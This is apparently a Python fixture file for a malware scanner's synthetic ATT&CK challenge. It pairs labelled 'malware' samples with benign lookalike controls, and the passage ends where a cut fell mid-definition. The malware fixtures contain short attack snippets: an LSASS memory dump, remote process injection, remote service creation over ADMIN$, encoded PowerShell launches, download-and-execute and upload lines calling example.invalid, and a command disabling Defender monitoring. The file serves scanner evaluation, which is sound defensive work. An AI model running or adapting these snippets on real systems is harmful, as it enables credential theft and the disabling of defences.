"""Split generation-intent and renderer definitions for the 10,000-sample ATT&CK challenge.

The generation intent remains scanner-hidden evaluation data. The renderer receives only the
renderer specification and therefore cannot observe malware/control or desired ATT&CK labels.
"""
from __future__ import annotations

from Virus_Scan.stress.attack_synthetic_schema import SyntheticAttackChallengePairDefinition
from Virus_Scan.stress.static_semantic_schema import (
    ArtifactRendererSpecification,
    CorpusFixtureDefinition,
    CorpusGenerationIntent,
    StaticFlowTruth,
    StaticReachabilityTruth,
)

SYNTHETIC_ATTACK_TECHNIQUE_IDS = (
    "T1003", "T1021", "T1041", "T1055",
    "T1059", "T1059.001", "T1105", "T1562.001",
)


def _r(kind: str, state: str, count: int = 1) -> StaticReachabilityTruth:
    return StaticReachabilityTruth(kind, state, count)


def _f(source: str, sink: str, connected: bool) -> StaticFlowTruth:
    return StaticFlowTruth(source, sink, connected)


_MALWARE_FIXTURES = (
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='python_lsass_dump',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('lsass.exe', 'OpenProcess', 'MiniDumpWriteDump'),
            desired_operation_kinds=('process_open', 'memory_read'),
            forbidden_operation_kinds=('memory_write',),
            desired_reachability=(_r('process_open', 'entrypoint_reachable', 1), _r('memory_read', 'entrypoint_reachable', 1)),
            desired_flow=(),
            desired_technique_ids=('T1003',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:python_lsass_dump',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.py',
            member_extension='',
            language='python',
            platform='Windows',
            source_text="import ctypes\nkernel32 = ctypes.windll.kernel32\ndbghelp = ctypes.windll.dbghelp\ntarget = 'lsass.exe'\nhandle = kernel32.OpenProcess(0x0010, False, target)\ndbghelp.MiniDumpWriteDump(target, 0, handle, 2, None, None, None)\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='batch_remote_admin_service',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('\\\\remote-host\\ADMIN$', 'remote-host', 'sc'),
            desired_operation_kinds=('process_launch',),
            forbidden_operation_kinds=('network_upload',),
            desired_reachability=(_r('process_launch', 'entrypoint_reachable', 2),),
            desired_flow=(),
            desired_technique_ids=('T1021',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:batch_remote_admin_service',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.cmd',
            member_extension='',
            language='batch',
            platform='Windows',
            source_text='@echo off\nnet use \\\\remote-host\\ADMIN$ /user:synthetic\\admin placeholder\nsc \\\\remote-host create UMIGE binPath= "cmd.exe /c echo UMIGE"\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='python_process_injection_sequence',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'),
            desired_operation_kinds=('process_open', 'memory_allocate', 'memory_write', 'thread_execute'),
            forbidden_operation_kinds=('network_send',),
            desired_reachability=(_r('process_open', 'entrypoint_reachable', 1), _r('memory_allocate', 'entrypoint_reachable', 1), _r('memory_write', 'entrypoint_reachable', 1), _r('thread_execute', 'entrypoint_reachable', 1)),
            desired_flow=(),
            desired_technique_ids=('T1055',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:python_process_injection_sequence',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.py',
            member_extension='',
            language='python',
            platform='Windows',
            source_text="import ctypes\nkernel32 = ctypes.windll.kernel32\nprocess = kernel32.OpenProcess(0x1F0FFF, False, 1234)\nremote = kernel32.VirtualAllocEx(process, None, 4096, 0x3000, 0x40)\nkernel32.WriteProcessMemory(process, remote, b'UMIGE', 5, None)\nkernel32.CreateRemoteThread(process, None, 0, remote, None, 0, None)\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='python_encoded_powershell_launch',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('powershell.exe', '-EncodedCommand'),
            desired_operation_kinds=('process_launch',),
            forbidden_operation_kinds=('network_send',),
            desired_reachability=(_r('process_launch', 'entrypoint_reachable', 1),),
            desired_flow=(),
            desired_technique_ids=('T1059.001',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:python_encoded_powershell_launch',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.py',
            member_extension='',
            language='python',
            platform='Windows',
            source_text="import subprocess\nsubprocess.run(['powershell.exe', '-EncodedCommand', 'QQBBAEEA'])\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='batch_download_file_execute',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('https://example.invalid/tool', 'C:\\Temp\\umige.ps1', 'powershell.exe'),
            desired_operation_kinds=('network_download', 'file_write', 'process_launch'),
            forbidden_operation_kinds=('network_upload',),
            desired_reachability=(_r('network_download', 'entrypoint_reachable', 1), _r('file_write', 'entrypoint_reachable', 1), _r('process_launch', 'entrypoint_reachable', 1)),
            desired_flow=(),
            desired_technique_ids=('T1105',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:batch_download_file_execute',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.cmd',
            member_extension='',
            language='batch',
            platform='Windows',
            source_text='@echo off\ncurl -o C:\\Temp\\umige.ps1 https://example.invalid/tool\npowershell.exe -File C:\\Temp\\umige.ps1\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='powershell_download_encoded_launch',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('https://example.invalid/tool', 'C:\\Temp\\umige.ps1', '-EncodedCommand'),
            desired_operation_kinds=('network_download', 'file_write', 'process_launch'),
            forbidden_operation_kinds=('network_upload',),
            desired_reachability=(_r('network_download', 'entrypoint_reachable', 1), _r('file_write', 'entrypoint_reachable', 1), _r('process_launch', 'entrypoint_reachable', 1)),
            desired_flow=(),
            desired_technique_ids=('T1059.001', 'T1105'),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:powershell_download_encoded_launch',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.ps1',
            member_extension='',
            language='powershell',
            platform='Windows',
            source_text="Invoke-WebRequest -Uri https://example.invalid/tool -OutFile C:\\Temp\\umige.ps1\nStart-Process powershell.exe -ArgumentList '-EncodedCommand','QQBBAEEA'\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='batch_generic_command_interpreter',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('cmd.exe',),
            desired_operation_kinds=('process_launch',),
            forbidden_operation_kinds=('network_send',),
            desired_reachability=(_r('process_launch', 'entrypoint_reachable', 1),),
            desired_flow=(),
            desired_technique_ids=('T1059',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:batch_generic_command_interpreter',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.cmd',
            member_extension='',
            language='batch',
            platform='Windows',
            source_text='@echo off\ncmd.exe /c echo UMIGE-SYNTHETIC\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='batch_exfiltration_channel',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('https://example.invalid/upload',),
            desired_operation_kinds=('network_send', 'network_upload'),
            forbidden_operation_kinds=('network_download',),
            desired_reachability=(_r('network_send', 'entrypoint_reachable', 1),),
            desired_flow=(),
            desired_technique_ids=('T1041',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:batch_exfiltration_channel',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.cmd',
            member_extension='',
            language='batch',
            platform='Windows',
            source_text='@echo off\nset data=UMIGE-SYNTHETIC\ncurl --data "%data%" https://example.invalid/upload\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='powershell_security_control_disable',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('Set-MpPreference', 'DisableRealtimeMonitoring'),
            desired_operation_kinds=('security_control_disable', 'security_configuration_modify'),
            forbidden_operation_kinds=('process_launch',),
            desired_reachability=(_r('security_control_disable', 'entrypoint_reachable', 1),),
            desired_flow=(),
            desired_technique_ids=('T1562.001',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:powershell_security_control_disable',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.ps1',
            member_extension='',
            language='powershell',
            platform='Windows',
            source_text='Set-MpPreference -DisableRealtimeMonitoring $true\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='renpy_encoded_powershell_launch',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('powershell.exe', '-EncodedCommand'),
            desired_operation_kinds=('process_launch',),
            forbidden_operation_kinds=('network_send',),
            desired_reachability=(_r('process_launch', 'entrypoint_reachable', 1),),
            desired_flow=(),
            desired_technique_ids=('T1059.001',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:renpy_encoded_powershell_launch',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.rpy',
            member_extension='',
            language='renpy',
            platform='Windows',
            source_text="label start:\n    pass\ninit python:\n    import subprocess\n    subprocess.run(['powershell.exe', '-EncodedCommand', 'QQBBAEEA'])\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='dotnet_managed_behavior',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('C:/Users/Test/Login Data', 'https://example.invalid/upload', 'kernel32.dll'),
            desired_operation_kinds=('file_read', 'network_send', 'process_launch', 'process_open'),
            forbidden_operation_kinds=('memory_write', 'native_syscall'),
            desired_reachability=(_r('file_read', 'entrypoint_reachable', 1), _r('network_send', 'entrypoint_reachable', 1), _r('process_launch', 'entrypoint_reachable', 1), _r('process_open', 'entrypoint_reachable', 1)),
            desired_flow=(_f('file_read', 'network_send', True),),
            desired_technique_ids=(),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:dotnet_managed_behavior',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='managed_pe',
            extension='.exe',
            member_extension='',
            language='dotnet_il',
            platform='Windows',
            source_text='Deterministic inert managed PE/CLI behavior fixture.\n',
            fixture_variant='managed_behavior',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='native_elf_import_flow_positive',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('phase5-native-buffer', 'resource:channel:primary'),
            desired_operation_kinds=('file_read', 'network_send', 'native_return'),
            forbidden_operation_kinds=('native_call', 'native_syscall'),
            desired_reachability=(_r('file_read', 'entrypoint_reachable', 1), _r('network_send', 'entrypoint_reachable', 1), _r('native_return', 'entrypoint_reachable', 1)),
            desired_flow=(_f('file_read', 'network_send', True),),
            desired_technique_ids=(),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v6:native_elf_import_flow_positive',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='native_elf_x86_64',
            extension='.elf',
            member_extension='',
            language='native_x86_64',
            platform='Linux',
            source_text='Deterministic inert dynamic ELF read-to-send semantic fixture; never executed.\n',
            fixture_variant='import_flow_positive',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='powershell_yara_corroborated_encoded_launch',
            malware_class='malware',
            coverage_cohort='malware_artifact',
            desired_parser_status='complete',
            desired_literal_references=('powershell.exe', '-EncodedCommand'),
            desired_operation_kinds=('process_launch',),
            forbidden_operation_kinds=('network_send',),
            desired_reachability=(_r('process_launch', 'entrypoint_reachable', 1),),
            desired_flow=(),
            desired_technique_ids=('T1059.001',),
            desired_artifact_implementation_state='expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:powershell_yara_corroborated_encoded_launch',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.ps1',
            member_extension='',
            language='powershell',
            platform='Windows',
            source_text=(
                "# [AppDomain]::CurrentDomain.DefineDynamicAssembly\n"
                "# InMemoryModule\n"
                "# MyDelegateType\n"
                "# New-Object System.Reflection.AssemblyName('ReflectedDelegate')\n"
                "# [Byte[]]$var_code = [System.Convert]::FromBase64String(\n"
                "# [IntPtr]::size -eq 8\n"
                "# Mandatory = $True\n"
                "Start-Process powershell.exe -ArgumentList '-EncodedCommand VU1JR0U='\n"
            ),
            fixture_variant='',
        ),
    ),
)

_CONTROL_FIXTURES = (
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='python_injection_documentation',
            malware_class='control',
            coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
            desired_literal_references=('OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('process_open', 'memory_allocate', 'memory_write', 'thread_execute'),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:python_injection_documentation',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.py',
            member_extension='',
            language='python',
            platform='Windows',
            source_text='"""OpenProcess VirtualAllocEx WriteProcessMemory CreateRemoteThread are documentation only."""\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='python_injection_dead_code',
            malware_class='control',
            coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
            desired_literal_references=('OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'),
            desired_operation_kinds=('process_open', 'memory_allocate', 'memory_write', 'thread_execute'),
            forbidden_operation_kinds=(),
            desired_reachability=(_r('process_open', 'unreachable', 1), _r('thread_execute', 'unreachable', 1)),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:python_injection_dead_code',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.py',
            member_extension='',
            language='python',
            platform='Windows',
            source_text="import ctypes\ndef never_called():\n    kernel32 = ctypes.windll.kernel32\n    process = kernel32.OpenProcess(0x1F0FFF, False, 1234)\n    remote = kernel32.VirtualAllocEx(process, None, 4096, 0x3000, 0x40)\n    kernel32.WriteProcessMemory(process, remote, b'UMIGE', 5, None)\n    kernel32.CreateRemoteThread(process, None, 0, remote, None, 0, None)\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='batch_admin_share_documentation',
            malware_class='control',
            coverage_cohort='administrative_or_dual_use',
            desired_parser_status='complete',
            desired_literal_references=('\\\\server\\ADMIN$', 'sc'),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('process_launch',),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:batch_admin_share_documentation',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.cmd',
            member_extension='',
            language='batch',
            platform='Windows',
            source_text='@echo off\nREM net use \\\\server\\ADMIN$\nREM sc \\\\server create service\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='powershell_encoded_help',
            malware_class='control',
            coverage_cohort='benign_script_lookalike',
            desired_parser_status='complete',
            desired_literal_references=('-EncodedCommand',),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('process_launch',),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:powershell_encoded_help',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.ps1',
            member_extension='',
            language='powershell',
            platform='Windows',
            source_text="Get-Help about_PowerShell_exe\nWrite-Output '-EncodedCommand training example'\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='batch_download_documentation',
            malware_class='control',
            coverage_cohort='benign_script_lookalike',
            desired_parser_status='complete',
            desired_literal_references=('https://example.invalid/tool', 'powershell.exe'),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('network_download', 'file_write', 'process_launch'),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:batch_download_documentation',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.cmd',
            member_extension='',
            language='batch',
            platform='Windows',
            source_text='@echo off\nREM curl -o C:\\Temp\\tool https://example.invalid/tool\nREM powershell.exe -File C:\\Temp\\tool\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='python_lsass_documentation',
            malware_class='control',
            coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
            desired_literal_references=('lsass.exe', 'OpenProcess', 'MiniDumpWriteDump'),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('process_open', 'memory_read'),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:python_lsass_documentation',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.py',
            member_extension='',
            language='python',
            platform='Windows',
            source_text='"""lsass.exe OpenProcess MiniDumpWriteDump incident-response documentation."""\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='powershell_security_help',
            malware_class='control',
            coverage_cohort='administrative_or_dual_use',
            desired_parser_status='complete',
            desired_literal_references=('Set-MpPreference', 'DisableRealtimeMonitoring'),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('security_control_disable',),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:powershell_security_help',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.ps1',
            member_extension='',
            language='powershell',
            platform='Windows',
            source_text="Get-Help Set-MpPreference\nWrite-Output 'DisableRealtimeMonitoring documentation'\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='malformed_python',
            malware_class='control',
            coverage_cohort='corrupt_or_truncated',
            desired_parser_status='failed',
            desired_literal_references=(),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('process_launch', 'network_send'),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='unavailable',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:malformed_python',
            unresolved_states=('parser_failed',),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.py',
            member_extension='',
            language='python',
            platform='multi',
            source_text='def broken(:\n    pass\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='unsupported_ruby_upload',
            malware_class='control',
            coverage_cohort='unsupported_or_unavailable',
            desired_parser_status='unavailable',
            desired_literal_references=('https://example.invalid/upload',),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('network_send',),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='unavailable',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:unsupported_ruby_upload',
            unresolved_states=('language_frontend_unavailable',),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text',
            extension='.rb',
            member_extension='',
            language='ruby_unsupported',
            platform='multi',
            source_text="require 'net/http'\nNet::HTTP.post(URI('https://example.invalid/upload'), 'UMIGE')\n",
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='dotnet_managed_documentation',
            malware_class='control',
            coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
            desired_literal_references=('C:/Users/Test/Login Data', 'https://example.invalid/upload'),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('file_read', 'network_send', 'process_launch', 'process_open'),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v5:dotnet_managed_documentation',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='managed_pe',
            extension='.exe',
            member_extension='',
            language='dotnet_il',
            platform='Windows',
            source_text='Deterministic inert managed PE/CLI documentation fixture.\n',
            fixture_variant='managed_documentation_only',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='native_elf_symbols_no_calls',
            malware_class='control',
            coverage_cohort='clean_software',
            desired_parser_status='complete',
            desired_literal_references=('phase5-native-buffer', 'resource:channel:primary'),
            desired_operation_kinds=('native_return',),
            forbidden_operation_kinds=('file_read', 'network_send', 'native_call', 'native_syscall'),
            desired_reachability=(_r('native_return', 'entrypoint_reachable', 1),),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-16:static-attack-matrix-v6:native_elf_symbols_no_calls',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='native_elf_x86_64',
            extension='.elf',
            member_extension='',
            language='native_x86_64',
            platform='Linux',
            source_text='Deterministic inert dynamic ELF with matching imports but no import calls.\n',
            fixture_variant='symbols_no_calls',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='batch_command_interpreter_documentation',
            malware_class='control',
            coverage_cohort='benign_script_lookalike',
            desired_parser_status='complete',
            desired_literal_references=('cmd.exe',),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('process_launch',),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:batch_command_interpreter_documentation',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text', extension='.cmd', member_extension='',
            language='batch', platform='Windows',
            source_text='@echo off\nREM cmd.exe /c echo UMIGE command-interpreter documentation\n',
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='batch_exfiltration_documentation',
            malware_class='control',
            coverage_cohort='benign_script_lookalike',
            desired_parser_status='complete',
            desired_literal_references=('https://example.invalid/upload',),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('file_read', 'network_send', 'network_upload'),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:batch_exfiltration_documentation',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text', extension='.cmd', member_extension='',
            language='batch', platform='Windows',
            source_text=(
                '@echo off\n'
                'REM set /p payload=<C:\\Temp\\report.txt\n'
                'REM curl -d @C:\\Temp\\report.txt https://example.invalid/upload\n'
            ),
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='renpy_encoded_powershell_documentation',
            malware_class='control',
            coverage_cohort='benign_script_lookalike',
            desired_parser_status='complete',
            desired_literal_references=('powershell.exe', '-EncodedCommand'),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('process_launch',),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:renpy_encoded_powershell_documentation',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text', extension='.rpy', member_extension='',
            language='renpy', platform='Windows',
            source_text=(
                'label start:\n    pass\n'
                'init python:\n'
                '    training_note = "powershell.exe -EncodedCommand documentation"\n'
            ),
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='powershell_yara_signature_only',
            malware_class='control',
            coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
            desired_literal_references=('powershell.exe', '-EncodedCommand'),
            desired_operation_kinds=(),
            forbidden_operation_kinds=('process_launch',),
            desired_reachability=(),
            desired_flow=(),
            desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:powershell_yara_signature_only',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='text', extension='.ps1', member_extension='',
            language='powershell', platform='Windows',
            source_text=(
                "# [AppDomain]::CurrentDomain.DefineDynamicAssembly\n"
                "# InMemoryModule\n"
                "# MyDelegateType\n"
                "# New-Object System.Reflection.AssemblyName('ReflectedDelegate')\n"
                "# [Byte[]]$var_code = [System.Convert]::FromBase64String(\n"
                "# [IntPtr]::size -eq 8\n"
                "# Mandatory = $True\n"
                "# powershell.exe -EncodedCommand VU1JR0U=\n"
            ),
            fixture_variant='',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='native_elf_calls_unreachable',
            malware_class='control', coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
            desired_literal_references=('phase5-native-buffer', 'resource:channel:primary'),
            desired_operation_kinds=('file_read', 'network_send', 'native_return'),
            forbidden_operation_kinds=('native_call', 'native_syscall'),
            desired_reachability=(
                _r('file_read', 'unreachable', 1), _r('network_send', 'unreachable', 1),
                _r('native_return', 'entrypoint_reachable', 1),
            ),
            desired_flow=(), desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:native_elf_calls_unreachable',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='native_elf_x86_64', extension='.elf', member_extension='',
            language='native_x86_64', platform='Linux',
            source_text='Deterministic inert ELF with matching calls placed after return.\n',
            fixture_variant='calls_unreachable',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='native_elf_wrong_target_identity',
            malware_class='control', coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
            desired_literal_references=('phase5-native-buffer', 'resource:channel:secondary'),
            desired_operation_kinds=('file_read', 'network_send', 'native_return'),
            forbidden_operation_kinds=('native_call', 'native_syscall'),
            desired_reachability=(
                _r('file_read', 'entrypoint_reachable', 1), _r('network_send', 'entrypoint_reachable', 1),
                _r('native_return', 'entrypoint_reachable', 1),
            ),
            desired_flow=(_f('file_read', 'network_send', True),), desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:native_elf_wrong_target_identity',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='native_elf_x86_64', extension='.elf', member_extension='',
            language='native_x86_64', platform='Linux',
            source_text='Deterministic inert ELF with same flow but different target resource.\n',
            fixture_variant='wrong_target_identity',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='native_elf_no_value_flow',
            malware_class='control', coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
